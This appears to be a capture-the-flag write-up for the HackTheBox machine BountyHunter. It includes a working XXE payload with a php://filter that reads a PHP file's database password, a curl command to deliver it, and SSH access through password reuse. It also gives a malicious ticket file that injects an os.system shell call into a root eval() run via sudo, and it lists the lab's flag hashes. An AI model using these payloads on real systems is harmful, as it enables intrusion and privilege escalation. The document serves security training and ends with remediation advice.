---
title: "HTB — BountyHunter (Easy Linux): XXE + Python eval() sudo"
date: 2026-05-13 12:00:00 +0000
categories: [Machines, HackTheBox]
tags: [hackthebox, linux, xxe, lfi, php-filter, eval, sudo, privesc, easy]
---

**IP:** 10.129.95.166 | **Difficulty:** Easy | **OS:** Linux (Ubuntu 20.04) | **Author:** ejedev

## Summary

Machine focused on XXE injection and code review. The bug bounty form sends base64-encoded XML, vulnerable to XXE. Using PHP filters we read `db.php` and obtain SSH credentials. Privilege escalation abuses a Python script with `eval()` that can be run as root via sudo.

| Flag | Hash |
|------|------|
| user.txt | `b332b0ebf595b78c2afa16dde71497a0` |
| root.txt | `3b7a3766b0dfdb69497f1ccb9cf8d63c` |

---

## 1. Reconnaissance

```bash
nmap -sV -sC -T4 -Pn 10.129.95.166
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1
80/tcp open  http    Apache httpd 2.4.41
```

---

## 2. Web Enumeration

```bash
ffuf -w ~/ctf/wordlists/SecLists/Discovery/Web-Content/common.txt \
     -u http://10.129.95.166/FUZZ -mc 200,301
```

`/resources/README.txt` leaks:
```
[ ] Disable 'test' account on portal and switch to hashed password.
```

The `log_submit.php` form POSTs to `/tracker_diRbPr00f314.php` with a `data` field = XML encoded as base64+URL. The XML structure:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<bugreport>
  <title>...</title><cwe>...</cwe><cvss>...</cvss><reward>...</reward>
</bugreport>
```

---

## 3. XXE Injection → Read db.php

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php"> ]>
<bugreport>
<title>test</title><cwe>test</cwe><cvss>test</cvss>
<reward>&file;</reward>
</bugreport>
```

```bash
XML='...'  # payload above
PAYLOAD=$(printf '%s' "$XML" | base64 -w 0 | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip()))")
curl -s -X POST http://10.129.95.166/tracker_diRbPr00f314.php -d "data=$PAYLOAD"
```

After base64-decoding the response:

```php
$dbpassword = "m19RoAU0hP41A1sTsq6K";
```

---

## 4. Foothold — SSH as development

Password reused on the `development` user:

```bash
ssh development@10.129.95.166
# password: m19RoAU0hP41A1sTsq6K
cat ~/user.txt
# b332b0ebf595b78c2afa16dde71497a0
```

---

## 5. Privilege Escalation — eval() in ticketValidator.py

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

The script reads a `.md` file and calls `eval()` on the `__Ticket Code__` field:

```python
validationNumber = eval(x.replace("**", ""))
```

**Conditions:** line starts with `**`, `int(ticketCode) % 7 == 4`, `validationNumber > 100`.

Formula: `7*25+4 = 179`, so `179 % 7 = 4 ✓`

**Malicious ticket `/tmp/f.md`:**

```markdown
# Skytrain Inc
## Ticket to Mars
__Ticket Code:__
**179+ 25 == 204 and __import__("os").system("/bin/bash") == True
```

```bash
sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py <<< "/tmp/f.md"
# root shell
cat /root/root.txt
# 3b7a3766b0dfdb69497f1ccb9cf8d63c
```

---

## Attack Chain

```
ffuf → /db.php, /resources/README.txt
  ↓ log_submit.php → XML base64 → POST /tracker_diRbPr00f314.php
  ↓ XXE + php://filter → db.php → m19RoAU0hP41A1sTsq6K
  ↓ SSH development → user.txt
  ↓ sudo ticketValidator.py → eval() → __import__('os').system('/bin/bash')
  ↓ root
```

---

## Lessons Learned

| Vulnerability | Remediation |
|---------------|-------------|
| XXE with no sanitization | Disable external entities in the XML parser |
| Credentials in PHP file readable via LFI | Use environment variables for secrets |
| Password reuse (DB → SSH) | Unique passwords per service |
| `eval()` on user-controlled input with sudo NOPASSWD | Never use eval() on user input |
